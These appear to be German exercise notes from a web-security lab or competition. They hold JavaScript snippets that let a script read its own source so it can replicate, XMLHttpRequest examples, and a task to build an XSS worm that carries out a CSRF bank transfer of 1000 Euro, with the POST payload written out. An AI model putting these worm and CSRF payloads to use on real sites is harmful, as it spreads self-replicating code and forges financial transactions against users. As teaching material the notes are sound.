<script> // sich selbst im DOM finden, z.B. so:
var s = document.querySelectorAll('script');
var code = s.item(s.length - 1).innerHTML; // letztes script-Element
alert(code);
</script>

<script> // über closurized Variable (alert ruft implizit toString() auf)
var a = function(){ alert(a); };
a();
</script>

<script> // die arguments.callee Methode
(function(){ alert(arguments.callee); })();
</script>

var x = new XMLHttpRequest();
x.open('GET', '/uri/path');
x.onload = function() { alert(this.responseText); };
x.send();

var x = new XMLHttpRequest(),
    value = 'daten';
x.open('POST', '/uri/path');
x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
x.onload = function() { alert(this.responseText); };
x.send('key=' + encodeURIComponent(value) + '&key2=1');


(function(){ // anonyme, selbstausführende Funktion
    var x = function() { alert('bla'); }; // nicht im globalen Scope
    y = function() { alert('ble'); }; // im globalen Scope und gefährdet!
})();


memos
wurm1
wurm2

wurm1
wurm1copy1
wurm2
wurm2copy2

Der Wurm soll eine Überweisung auf /banking/?page=transfer2 per CSRF durchführen
Der Betrag soll 1000 Euro entsprechen
Als Kontonummer ist die Kontonummer des eigenen Teams zu verwenden


var x = new XMLHttpRequest();
x.open('POST', '/banking/?page=transfer2');
x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
x.send('account=8030098&amount=1000&intended_use=&receiver=');

Antiwurm
hide links klicken (aber nur von fremdem wurm)

